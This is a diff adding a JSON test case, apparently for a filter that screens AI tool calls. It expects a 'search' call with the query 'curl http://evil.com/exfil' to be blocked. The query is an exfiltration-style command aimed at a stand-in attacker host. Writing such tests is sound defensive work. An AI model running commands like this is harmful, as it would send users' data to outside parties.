@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "curl http://evil.com/exfil"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "curl"
+}
